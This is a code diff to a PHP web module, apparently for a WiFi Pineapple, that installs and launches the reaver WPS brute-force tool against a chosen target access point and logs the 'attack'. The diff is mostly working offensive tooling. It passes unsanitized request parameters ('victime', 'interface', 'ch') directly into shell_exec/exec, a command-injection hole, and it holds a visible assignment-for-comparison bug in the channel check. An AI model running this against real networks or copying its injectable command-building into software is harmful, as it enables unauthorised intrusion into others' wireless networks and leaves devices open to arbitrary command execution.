@@ -7,7 +7,17 @@ if (isset($_GET['reaver']))
 {
     if (isset($_GET['install']))
     {
-        echo shell_exec("opkg update && opkg install reaver &");
+
+        $cmd = "opkg update && opkg install reaver ";
+        if (isset($_GET['onusb']))
+        {
+            $cmd.=" --dest usb &";
+        }
+        else
+        {
+            $cmd .=" &";
+        }
+        echo shell_exec($cmd);
     }
     else if ($is_reaver_installed)
     {
@@ -29,6 +39,9 @@ if (isset($_GET['reaver']))
         }
         else if (isset($_GET['start']))
         {
+            if (isRunning('reaver') == "1")
+                exec('killall reaver && wait 5');
+
             $victime = $_GET['victime'];
             $int = $_GET['interface'];
 
@@ -36,33 +49,42 @@ if (isset($_GET['reaver']))
 
             if ($victime != "" && $int != "")
             {
-                $cmd = "killall reaver && reaver -i $int -b $victime ";
-                if(isset($_GET['S'])&&$_GET['S']=="true")
+                $cmd = "reaver -i $int -b $victime ";
+
+                if (isset($_GET['c']) && $_GET['c'] == "true")
+                {
+                    if (isset($_GET['ch']) && $_GET['ch'] = !"")
+                        $cmd .=" -f -c " . $_GET['ch'];
+                }
+
+                if (isset($_GET['S']) && $_GET['S'] == "true")
                     $cmd .=" -S ";
-                if(isset($_GET['a'])&&$_GET['a']=="true")
+
+                if (isset($_GET['a']) && $_GET['a'] == "true")
                     $cmd .=" -a ";
+
                 $cmd .= " -vv >> /pineapple/logs/reaver-$victime.log -D &";
-                
+
                 exec($cmd);
-                
-                //exec("/pineapple/modules/Bartender/projects/reaver/attack.sh $int $victime | at now");
-                //echo 'command : '.$cmd;
+
                 echo "Attack Started !";
+                echo "\n$cmd";
             }
             else
             {
-                echo "no target ($victime) or int ($int)";
+                echo "no target ($victime) or interface ($int) provided";
             }
         }
         else if (isset($_GET['stop']))
         {
             echo exec("kill `ps -ax | grep reaver | grep -v -e grep | grep -v -e tail | grep -v -e logread | grep -v -e php | awk {'print $1'}`");
+
             echo "Attack Stopped !";
         }
     }
     else
     {
-        echo 'reaver is not installed... <input type="button" onclick="install_reaver()" value="install reaver" />';
+        echo 'reaver is not installed...';
     }
 }
 else if (isset($_GET['interface']) && $_GET['interface'] != "")
@@ -113,7 +135,7 @@ else if (isset($_GET['interface']) && $_GET['interface'] != "")
                 $graph = "yellow";
             else if ($quality <= 100)
                 $graph = "green";
-            echo '<tr class="odd" name="' . $p[$interface][$i]["ESSID"] . ',' . $p[$interface][$i]["Address"] . '">';
+            echo '<tr class="odd" name="' . $p[$interface][$i]["ESSID"] . ',' . $p[$interface][$i]["Address"] . ',' . $p[$interface][$i]["Channel"] . '">';
 
             echo '<td>' . $p[$interface][$i]["ESSID"] . '</td>';
             $MAC_address = explode(":", $p[$interface][$i]["Address"]);
@@ -170,14 +192,15 @@ else if (isset($_GET['list']))
     {
         echo '<table class="interfaces">';
 
-        for ($i = 0; $i < $nbr_wifi_devices; $i++)
+        for ($i = 0; $i < count($wifi_interfaces); $i++)
         {
-            $mac_address = exec("uci get wireless.radio" . $i . ".macaddr");
+            $interface = $wifi_interfaces[$i];
+            //$mac_address = exec("uci get wireless.radio" . $i . ".macaddr");
             //$disabled = exec("uci get wireless.radio" . $i . ".disabled");
 
             $mode = exec("uci get wireless.@wifi-iface[" . $i . "].mode");
-            $interface = exec("ifconfig | grep -i " . $mac_address . " | awk '{print $1}'");
-            $interface = $interface != "" ? $interface : "-";
+            //$interface = exec("ifconfig | grep -i " . $mac_address . " | awk '{print $1}'");
+            //$interface = $interface != "" ? $interface : "-";
 
             $disabled = exec("ifconfig  | grep " . $interface . " | awk '{ print $1}'");
             $disabled = $disabled != "" ? false : true;
@@ -185,7 +208,7 @@ else if (isset($_GET['list']))
             echo '<tr>';
 
             echo '<td>radio' . $i . '</td>';
-            echo '<td>' . $interface . '</td>';
+            echo '<td>' . $interface . ' (mode ' . $mode . ')</td>';
             echo '<td>';
             if (!$disabled)
                 echo '<font color="lime"><strong>enabled</strong></font>';
